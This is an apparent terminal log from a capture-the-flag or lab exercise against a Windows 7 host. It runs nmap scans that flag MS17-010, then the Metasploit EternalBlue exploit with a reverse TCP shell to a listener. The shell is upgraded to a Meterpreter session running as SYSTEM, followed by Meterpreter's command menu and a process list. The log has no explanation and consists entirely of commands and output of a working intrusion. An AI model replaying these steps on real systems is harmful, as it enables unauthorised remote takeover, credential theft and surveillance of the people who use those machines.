
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn 10.10.237.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:16 CEST
Nmap scan report for 10.10.237.234
Host is up (0.039s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2024-04-08T19:02:33
|_Not valid after:  2024-10-08T19:02:33
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2024-04-09T19:17:30+00:00
|_ssl-date: 2024-04-09T19:17:35+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: 0s
| smb2-time: 
|   date: 2024-04-09T19:17:30
|_  start_date: 2024-04-09T19:02:32
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:11:ff:f1:09:65 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-09T14:17:30-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.94 seconds
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sC -sV -Pn 10.10.237.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:17 CEST
Nmap scan report for 10.10.237.234
Host is up (0.040s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2024-04-08T19:02:33
|_Not valid after:  2024-10-08T19:02:33
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2024-04-09T19:20:07+00:00
|_ssl-date: 2024-04-09T19:20:12+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:11:ff:f1:09:65 (unknown)
|_clock-skew: mean: 59m59s, deviation: 2h14m09s, median: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-09T19:20:07
|_  start_date: 2024-04-09T19:02:32
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-09T14:20:07-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.32 seconds
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nmap -sV -vv --script vuln 10.10.237.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:27 CEST
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:27
Completed NSE at 21:27, 10.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:27
Completed NSE at 21:27, 0.00s elapsed
Initiating Ping Scan at 21:27
Scanning 10.10.237.234 [2 ports]
Completed Ping Scan at 21:27, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:27
Completed Parallel DNS resolution of 1 host. at 21:27, 0.00s elapsed
Initiating Connect Scan at 21:27
Scanning 10.10.237.234 [1000 ports]
Discovered open port 3389/tcp on 10.10.237.234
Discovered open port 445/tcp on 10.10.237.234
Discovered open port 139/tcp on 10.10.237.234
Discovered open port 135/tcp on 10.10.237.234
Discovered open port 49152/tcp on 10.10.237.234
Discovered open port 49153/tcp on 10.10.237.234
Discovered open port 49158/tcp on 10.10.237.234
Discovered open port 49154/tcp on 10.10.237.234
Discovered open port 49160/tcp on 10.10.237.234
Completed Connect Scan at 21:27, 0.65s elapsed (1000 total ports)
Initiating Service scan at 21:27
Scanning 9 services on 10.10.237.234
Service scan Timing: About 44.44% done; ETC: 21:29 (0:01:08 remaining)
Completed Service scan at 21:28, 83.82s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.237.234.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:28
NSE: [firewall-bypass 10.10.237.234] lacks privileges.
NSE Timing: About 99.91% done; ETC: 21:29 (0:00:00 remaining)
Completed NSE at 21:29, 60.35s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:29
NSE: [tls-ticketbleed 10.10.237.234:139] Not running due to lack of privileges.
NSE: [ssl-ccs-injection 10.10.237.234:3389] No response from server: ERROR
Completed NSE at 21:29, 1.51s elapsed
Nmap scan report for 10.10.237.234
Host is up, received conn-refused (0.039s latency).
Scanned at 2024-04-09 21:27:32 CEST for 146s
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:29
Completed NSE at 21:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:29
Completed NSE at 21:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.78 seconds
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nmap -sV --script vuln 10.10.237.234 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:34 CEST
Nmap scan report for 10.10.237.234
Host is up (0.037s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.46 seconds
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.4.1-dev                           ]
+ -- --=[ 2407 exploits - 1239 auxiliary - 422 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                             s/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows S
                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2,
                                              Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.233.133  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.18.21.236
LHOST => 10.18.21.236
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.237.234
RHOSTS => 10.10.237.234
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.237.234    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                             s/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows S
                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serve
                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2,
                                              Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.21.236     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.21.236:4444 
[*] 10.10.237.234:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.237.234:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.237.234:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.237.234:445 - The target is vulnerable.
[*] 10.10.237.234:445 - Connecting to target for exploitation.
[+] 10.10.237.234:445 - Connection established for exploitation.
[+] 10.10.237.234:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.237.234:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.237.234:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.237.234:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.237.234:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.237.234:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.237.234:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.237.234:445 - Sending all but last fragment of exploit packet
[*] 10.10.237.234:445 - Starting non-paged pool grooming
[+] 10.10.237.234:445 - Sending SMBv2 buffers
[+] 10.10.237.234:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.237.234:445 - Sending final SMBv2 buffers.
[*] 10.10.237.234:445 - Sending last fragment of exploit packet!
[*] 10.10.237.234:445 - Receiving response from exploit packet
[+] 10.10.237.234:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.237.234:445 - Sending egg to corrupted connection.
[*] 10.10.237.234:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.237.234
[*] Command shell session 1 opened (10.18.21.236:4444 -> 10.10.237.234:49251) at 2024-04-09 22:11:16 +0200
[+] 10.10.237.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.237.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.237.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                                    Connection
  --  ----  ----               -----------                                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.  10.18.21.236:4444 -> 10.10.237.234:49251 (10.1
                               7601] -----                                    0.237.234)

msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > search post meterpreter windows shell

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1     \_ target: Automatic                                      .                .          .      .
   2     \_ target: Unix/OSX/Linux                                 .                .          .      .
   3     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   4     \_ target: Windows (CMD)                                  .                .          .      .
   5   exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
   6     \_ target: Python                                         .                .          .      .
   7     \_ target: PHP                                            .                .          .      .
   8     \_ target: PSH                                            .                .          .      .
   9     \_ target: Regsvr32                                       .                .          .      .
   10    \_ target: pubprn                                         .                .          .      .
   11    \_ target: SyncAppvPublishingServer                       .                .          .      .
   12    \_ target: PSH (Binary)                                   .                .          .      .
   13    \_ target: Linux                                          .                .          .      .
   14    \_ target: Mac OS X                                       .                .          .      .
   15  post/multi/manage/shell_to_meterpreter                      .                normal     No     Shell to Meterpreter Upgrade
   16  post/windows/manage/powershell/exec_powershell              .                normal     No     Windows Manage PowerShell Download and/or Execute                                                                                                     
   17  post/windows/manage/exec_powershell                         .                normal     No     Windows Powershell Execution Post Module


Interact with a module by name or index. For example info 17, use 17 or use post/windows/manage/exec_powershell

msf6 > use 15
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.18.21.236     no        IP of host that will receive the connection from the payload (Will try to auto detect
                                       ).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.18.21.236:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (201798 bytes) to 10.10.237.234
[*] Meterpreter session 2 opened (10.18.21.236:4433 -> 10.10.237.234:49258) at 2024-04-09 22:17:21 +0200
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                 Connection
  --  ----  ----                     -----------                                 ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6  10.18.21.236:4444 -> 10.10.237.234:49251 (1
                                     .1.7601] -----                              0.10.237.234)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                10.18.21.236:4433 -> 10.10.237.234:49258 (1
                                                                                 0.10.237.234)

msf6 post(multi/manage/shell_to_meterpreter) > session -i 2
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes

For more info on a specific command, use <command> -h or help <command>.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 444   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 556   548   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 604   548   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 616   596   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 656   596   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 704   604   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 712   604   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 720   604   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 772   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 828   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 896   704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 944   704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1012  656   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1076  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1160  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1232  556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1300  704   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1336  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1404  704   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent
                                                                                .exe
 1416  704   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 1472  704   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.e
                                                                                xe
